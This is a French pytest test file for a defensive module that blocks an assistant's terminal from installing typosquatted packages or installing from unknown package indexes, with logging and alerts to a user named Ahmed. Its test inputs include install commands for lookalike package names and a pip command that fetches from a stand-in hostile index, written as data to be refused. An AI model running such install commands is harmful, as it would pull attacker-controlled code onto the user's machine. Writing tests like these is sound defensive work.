"""Système immunitaire, lot 6 (29/10) : le code piégé. Un paquet installé par son terminal dont le nom imite un paquet
connu (typosquattage : « reqeusts » pour « requests »), ou tiré d'un index inconnu : refusé avant de tourner, incident,
Ahmed prévenu. Un nom vérifié par Ahmed s'accepte d'un geste (immunite.py paquet-accepter <nom>)."""
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "jarvis"))
import immunite  # noqa: E402

RACINE = Path(__file__).resolve().parents[1]


@pytest.fixture
def D(tmp_path, monkeypatch):
    d = tmp_path / "immunite"
    monkeypatch.setattr(immunite, "DOSSIER", d)
    return d


@pytest.mark.parametrize("commande, imite", [
    ("pip install reqeusts", "requests"),
    ("cd atelier && python3 -m pip install --quiet numpyy==1.26", "numpy"),
    ("uv pip install 'pandsa>=2'", "pandas"),
    ("npm i expresss", "express"),
    ("npx lodahs", "lodash"),
    ("pip install matplotllib scipy", "matplotlib"),
])
def test_un_nom_qui_imite_un_paquet_connu_est_refuse(D, commande, imite):
    r = immunite.verifier_paquets(commande)
    assert r and imite in r and "paquet-accepter" in r
    i = [json.loads(l) for l in (D / "incidents.jsonl").read_text().splitlines()]
    assert i[-1]["famille"] == "paquet" and immunite._source_courte(i[-1]["source"]) == "terminal"


@pytest.mark.parametrize("commande", [
    "pip install requests numpy==1.26 'pandas>=2' scapy torch",
    "python -m pip install -r requirements.txt",
    "uv pip install -e .",
    "npm install express lodash @types/node react@18",
    "ls -la && echo pip install",
    "git clone https://github.com/x/y && cd y",
    "pip install 'unbalanced",
    "pip install mlx-lm sentence-transformers",
])
def test_les_installations_ordinaires_passent(D, commande):
    assert immunite.verifier_paquets(commande) is None


def test_un_index_inconnu_est_refuse(D):
    r = immunite.verifier_paquets("pip install --index-url https://evil.example/simple requests")
    assert r and "index" in r
    assert immunite.verifier_paquets("pip install --extra-index-url=https://pypi.org/simple requests") is None


def test_un_nom_verifie_par_ahmed_passe(D):
    assert immunite.verifier_paquets("pip install reqeusts")
    assert immunite.main(["paquet-accepter", "reqeusts"]) == 0
    assert immunite.verifier_paquets("pip install reqeusts") is None


def test_ahmed_est_prevenu(D):
    immunite.verifier_paquets("pip install reqeusts")
    x = [json.loads(l) for l in (D / "a-dire.jsonl").read_text().splitlines()][-1]
    assert x["type"] == "paquet" and x["gravite"] == "moyenne" and "requests" in x["texte"]


def test_branche_dans_son_terminal_avant_toute_execution():
    s = (RACINE / "jarvis" / "mcp_terminal.py").read_text(encoding="utf-8")
    corps = s[s.index("async def executer("):s.index("\n\n\n", s.index("async def executer("))]
    assert corps.index("immunite.verifier_paquets(commande)") < corps.index("taches.lancer")
